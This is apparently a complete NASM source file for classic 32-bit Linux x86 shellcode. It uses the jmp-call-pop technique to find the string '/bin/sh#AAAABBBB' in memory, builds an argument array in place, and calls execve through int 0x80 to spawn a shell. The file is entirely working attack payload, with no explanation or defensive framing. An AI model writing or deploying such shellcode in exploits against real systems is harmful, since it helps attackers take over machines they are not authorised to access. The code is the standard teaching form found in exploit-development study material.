BITS 32
jmp short callit

doit:
pop esi
xor eax, eax
mov byte [esi+7], al
lea ebx, [esi]
mov dword [esi+8], ebx
mov dword [esi+12], eax
mov byte al, 0x0b
mov ebx, esi
lea ecx, [esi+8]
lea edx, [esi+12]
int 0x80
callit:
call  doit

db '/bin/sh#AAAABBBB'
